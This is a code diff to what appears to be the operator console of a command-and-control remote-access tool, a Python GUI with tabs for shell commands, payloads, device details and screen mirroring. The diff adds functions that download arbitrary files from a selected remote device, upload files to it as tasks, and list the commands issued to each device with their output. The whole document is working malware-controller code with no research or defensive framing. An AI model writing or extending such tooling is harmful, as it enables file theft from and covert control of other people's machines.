@@ -4,6 +4,8 @@ from functools import partial
 import os
 import json
 from gui.screen_mirror_window import ScreenMirrorWindow
+import tkinter.filedialog
+import base64
 
 C2_API_URL = "http://127.0.0.1:8000/api"
 DEBUG_API_URL = "http://127.0.0.1:8000/debug"
@@ -45,6 +47,7 @@ class App(customtkinter.CTk):
         self.tab_view.add("File Manager")
         self.tab_view.add("Payloads")
         self.tab_view.add("Device Details")
+        self.tab_view.add("Tasks & Results")
         self.tab_view.add("Debug")
 
         self.setup_tabs()
@@ -78,6 +81,10 @@ class App(customtkinter.CTk):
         self.fm_path_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
         self.fm_go_button = customtkinter.CTkButton(self.fm_controls_frame, text="Go", width=50, command=self.fm_go)
         self.fm_go_button.grid(row=0, column=2, padx=5, pady=5)
+        self.fm_download_button = customtkinter.CTkButton(self.fm_controls_frame, text="Download File", command=self.download_file)
+        self.fm_download_button.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
+        self.fm_upload_button = customtkinter.CTkButton(self.fm_controls_frame, text="Upload File", command=self.upload_file)
+        self.fm_upload_button.grid(row=1, column=1, columnspan=2, padx=5, pady=5, sticky="ew")
         self.fm_output_label = customtkinter.CTkLabel(self.tab_view.tab("File Manager"), text="File Manager output will appear in the 'Shell' tab's results box.", anchor="w")
         self.fm_output_label.grid(row=1, column=0, padx=10, pady=10, sticky="new")
 
@@ -99,6 +106,16 @@ class App(customtkinter.CTk):
         self.debug_tasks_button.pack(side="left", expand=True, padx=10, pady=10)
         self.debug_results_button = customtkinter.CTkButton(self.debug_frame, text="Dump All Results", command=lambda: self.debug_dump("results"))
         self.debug_results_button.pack(side="left", expand=True, padx=10, pady=10)
+
+        self.setup_tasks_results_tab()
+
+    def setup_tasks_results_tab(self):
+        # -- Tasks & Results Tab --
+        self.tasks_results_frame = customtkinter.CTkScrollableFrame(self.tab_view.tab("Tasks & Results"), label_text="Tasks and Results")
+        self.tasks_results_frame.pack(fill="both", expand=True, padx=5, pady=5)
+        self.tasks_results_frame.grid_columnconfigure(0, weight=1)
+        self.tasks_results_label = customtkinter.CTkLabel(self.tasks_results_frame, text="Select a device to view its tasks and results.", wraplength=400, justify="left")
+        self.tasks_results_label.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
 
     def confirm_delete_device(self):
         if not self.selected_device_id:
@@ -191,9 +208,75 @@ class App(customtkinter.CTk):
         self.fm_path_entry.insert(0, parent_path)
         self.fm_go()
 
+    def download_file(self):
+        if not self.selected_device_id:
+            customtkinter.CTkMessagebox(title="Error", message="No device selected.")
+            return
+
+        remote_path_dialog = customtkinter.CTkInputDialog(text="Enter remote file path to download:", title="Download File")
+        remote_file_path = remote_path_dialog.get_input()
+
+        if not remote_file_path: return
+
+        try:
+            response = requests.post(f"{C2_API_URL}/file/download/{self.selected_device_id}", json={"file_path": remote_file_path})
+            response.raise_for_status()
+            data = response.json()
+            
+            if data.get("content"):
+                local_save_path = tkinter.filedialog.asksaveasfilename(
+                    initialfile=os.path.basename(remote_file_path),
+                    title="Save file as",
+                    defaultextension=".bin"
+                )
+                if local_save_path:
+                    decoded_content = base64.b64decode(data["content"])
+                    with open(local_save_path, "wb") as f:
+                        f.write(decoded_content)
+                    customtkinter.CTkMessagebox(title="Success", message=f"File downloaded to {local_save_path}")
+            else:
+                customtkinter.CTkMessagebox(title="Error", message="No content received for download.")
+
+        except requests.RequestException as e:
+            customtkinter.CTkMessagebox(title="Error", message=f"Error downloading file: {e}")
+        except Exception as e:
+            customtkinter.CTkMessagebox(title="Error", message=f"An unexpected error occurred: {e}")
+
+    def upload_file(self):
+        if not self.selected_device_id:
+            customtkinter.CTkMessagebox(title="Error", message="No device selected.")
+            return
+
+        local_file_path = tkinter.filedialog.askopenfilename(title="Select file to upload")
+        if not local_file_path: return
+
+        remote_path_dialog = customtkinter.CTkInputDialog(text=f"Enter remote destination path for {os.path.basename(local_file_path)}:", title="Upload File")
+        remote_destination_path = remote_path_dialog.get_input()
+
+        if not remote_destination_path: return
+
+        try:
+            with open(local_file_path, "rb") as f:
+                file_content = f.read()
+            encoded_content = base64.b64encode(file_content).decode('utf-8')
+
+            payload = {
+                "file_path": remote_destination_path,
+                "content": encoded_content
+            }
+            response = requests.post(f"{C2_API_URL}/file/upload/{self.selected_device_id}", json=payload)
+            response.raise_for_status()
+            customtkinter.CTkMessagebox(title="Success", message=f"File upload task created for {remote_destination_path}")
+
+        except requests.RequestException as e:
+            customtkinter.CTkMessagebox(title="Error", message=f"Error uploading file: {e}")
+        except Exception as e:
+            customtkinter.CTkMessagebox(title="Error", message=f"An unexpected error occurred: {e}")
+
     def auto_refresh(self):
         self.refresh_devices()
         self.refresh_results()
+        self.refresh_tasks_and_results()
         self.after(5000, self.auto_refresh)
 
     def select_device(self, device_id, button):
@@ -207,6 +290,7 @@ class App(customtkinter.CTk):
         self.fm_path_entry.delete(0, "end")
         self.fm_path_entry.insert(0, ".")
         self.refresh_results()
+        self.refresh_tasks_and_results()
 
     def open_screen_mirror(self):
         if not self.selected_device_id: return
@@ -255,6 +339,59 @@ class App(customtkinter.CTk):
             self.results_box.delete("1.0", "end")
             self.results_box.insert("1.0", "Could not fetch results.")
             self.results_box.configure(state="disabled")
+
+    def refresh_tasks_and_results(self):
+        if not self.selected_device_id:
+            self.tasks_results_label.configure(text="Select a device to view its tasks and results.")
+            return
+
+        try:
+            # Fetch all tasks for the selected device
+            tasks_response = requests.get(f"{C2_API_URL}/tasks/{self.selected_device_id}")
+            tasks_response.raise_for_status()
+            all_tasks = tasks_response.json()
+
+            # Fetch all results for the selected device
+            results_response = requests.get(f"{C2_API_URL}/results/{self.selected_device_id}")
+            results_response.raise_for_status()
+            all_results = results_response.json()
+
+            # Map results to tasks
+            results_map = {result['task_id']: result for result in all_results}
+
+            # Clear previous content
+            for widget in self.tasks_results_frame.winfo_children():
+                widget.destroy()
+
+            if not all_tasks:
+                customtkinter.CTkLabel(self.tasks_results_frame, text="No tasks found for this device.", wraplength=400, justify="left").pack(padx=10, pady=5, fill="x")
+                return
+
+            # Display tasks and their results
+            for task in sorted(all_tasks, key=lambda t: t['created_at'], reverse=True):
+                task_frame = customtkinter.CTkFrame(self.tasks_results_frame)
+                task_frame.pack(fill="x", padx=5, pady=5)
+                task_frame.grid_columnconfigure(0, weight=1)
+
+                task_info = f"[{task['created_at']}] Task ID: {task['id']}\nCommand: {task['command']}\nStatus: {task['status']}"
+                customtkinter.CTkLabel(task_frame, text=task_info, wraplength=400, justify="left", font=customtkinter.CTkFont(weight="bold")).grid(row=0, column=0, sticky="ew", padx=5, pady=2)
+
+                result = results_map.get(task['id'])
+                if result:
+                    result_info = f"Result:\n{result['output']}"
+                    customtkinter.CTkTextbox(task_frame, height=100, state="normal", wrap="word").grid(row=1, column=0, sticky="ew", padx=5, pady=2)
+                    # Get the textbox widget to insert text
+                    textbox = task_frame.winfo_children()[-1]
+                    textbox.insert("1.0", result_info)
+                    textbox.configure(state="disabled")
+                else:
+                    customtkinter.CTkLabel(task_frame, text="Result: Pending...", wraplength=400, justify="left").grid(row=1, column=0, sticky="ew", padx=5, pady=2)
+
+        except requests.RequestException as e:
+            print(f"Error fetching tasks and results: {e}")
+            for widget in self.tasks_results_frame.winfo_children():
+                widget.destroy()
+            customtkinter.CTkLabel(self.tasks_results_frame, text=f"Error fetching tasks and results: {e}", wraplength=400, justify="left").pack(padx=10, pady=5, fill="x")
 
     def send_command_internal(self, command):
         if not self.selected_device_id:
